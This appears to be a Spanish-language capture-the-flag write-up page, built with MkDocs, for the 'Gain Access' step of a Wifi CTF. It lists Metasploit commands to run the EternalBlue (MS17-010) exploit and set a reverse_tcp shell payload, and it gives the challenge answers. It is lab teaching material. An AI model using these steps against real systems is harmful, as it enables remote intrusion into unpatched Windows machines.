@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  
+  
+  <link rel="shortcut icon" href="../img/favicon.ico">
+  <title>Gain Access - Wifi CTF (ReadteamRD)</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700" />
+
+  <link rel="stylesheet" href="../css/theme.css" />
+  <link rel="stylesheet" href="../css/theme_extra.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css" />
+  
+  <script>
+    // Current page data
+    var mkdocs_page_name = "Gain Access";
+    var mkdocs_page_input_path = "gain_access.md";
+    var mkdocs_page_url = null;
+  </script>
+  
+  <script src="../js/jquery-2.1.1.min.js" defer></script>
+  <script src="../js/modernizr-2.8.3.min.js" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+        <a href=".." class="icon icon-home"> Wifi CTF (ReadteamRD)</a>
+        <div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="..">Home</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../recon/">Recon</a>
+                    </li>
+                </ul>
+                <ul class="current">
+                    <li class="toctree-l1 current"><a class="reference internal current" href="./">Gain Access</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#find-the-exploitation-code-we-will-run-against-the-machine-what-is-the-full-path-of-the-code">Find the exploitation code we will run against the machine. What is the full path of the code?</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#show-options-and-set-the-one-required-value-what-is-the-name-of-this-value">Show options and set the one required value. What is the name of this value?</a>
+    </li>
+    </ul>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../escalate/">Escalate</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../cracking/">Cracking</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../find_flags/">find_flags</a>
+                    </li>
+                </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+        <a href="..">Wifi CTF (ReadteamRD)</a>
+      </nav>
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="..">Docs</a> &raquo;</li>
+    
+      
+    
+    <li>Gain Access</li>
+    <li class="wy-breadcrumbs-aside">
+      
+    </li>
+  </ul>
+  
+  <hr/>
+</div>
+
+          <div role="main">
+            <div class="section">
+              
+                <h1 id="metasploit"><strong>Metasploit</strong></h1>
+<p>En esta parte estaremos usando Mestasploit para acceder a la máquina víctima por medio del ataque EthernalBlue.</p>
+<p>Lo primero que haremos es iniciar metasploit con el siguiente comando:</p>
+<pre><code class="language-bash">msconsole -q
+</code></pre>
+<h2 id="find-the-exploitation-code-we-will-run-against-the-machine-what-is-the-full-path-of-the-code"><strong>Find the exploitation code we will run against the machine. What is the full path of the code?</strong></h2>
+<p>Ahora lo que haremos es muscar un exploit que nos sirva para explotar la vulnerabilidad Ethernablue.</p>
+<p>Simplemente realizaremos la siguiente búsqueda dentro de metasploit y veremos que sucede.</p>
+<pre><code class="language-bash">search ms17_010
+</code></pre>
+<p><img alt="ga1" src="../img/ga1.png" /></p>
+<p>Efectivamente encontramos lo que estamos buscando, para seleccionarlo, por lo tanto la respuesta a la pregunta es ese full path.
+Para seleccionarlo usamos el comando</p>
+<pre><code class="language-bash">use 0 
+</code></pre>
+<p><strong>Respuesta:</strong> exploit/windows/smb/ms17_010_eternalblue</p>
+<h2 id="show-options-and-set-the-one-required-value-what-is-the-name-of-this-value"><strong>Show options and set the one required value. What is the name of this value?</strong></h2>
+<p>Si realizamos un <strong>show options</strong>, veremos las opciones que queremos configurar, en nuestro caso, solamente <strong>RHOST.</strong> </p>
+<p><img alt="ga2" src="../img/ga2.png" /></p>
+<p>Aunque la respuesta correcta sea RHOST, también tendremos que modificar nuestro <strong>LHOST</strong> debido a que estamos conectados por VPN.</p>
+<div class="admonition importan">
+<p class="admonition-title">Importan</p>
+<p>Si no configuran el <strong>LHOST</strong>, el ataque no será exitoso.</p>
+</div>
+<p>Por lo general el payload se asigna automáticamente, pero para quitar las dudas lo asignaremos con el siguiente comando:</p>
+<pre><code class="language-bash">set payload windows/x64/shell/reverse_tcp
+</code></pre>
+<p>Hecho todo esto solo tendremos que escribir <strong>run</strong> y presionar <strong>ENTER</strong> y gualá Reverse shell lograda !!!!</p>
+<p>Los otros apartados dentro de la sección no se tomarán en cuenta, ya que soy muy fáciles de hacer y no necesitan respuesta alguna.</p>
+<p><img alt="ga3" src="../img/ga3.png" /></p>
+              
+            </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="../escalate/" class="btn btn-neutral float-right" title="Escalate">Next <span class="icon icon-circle-arrow-right"></span></a>
+      
+      
+        <a href="../recon/" class="btn btn-neutral" title="Recon"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+    
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+      
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../recon/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../escalate/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script>var base_url = '..';</script>
+    <script src="../js/theme_extra.js" defer></script>
+    <script src="../js/theme.js" defer></script>
+      <script src="../search/main.js" defer></script>
+    <script defer>
+        window.onload = function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        };
+    </script>
+
+</body>
+</html>
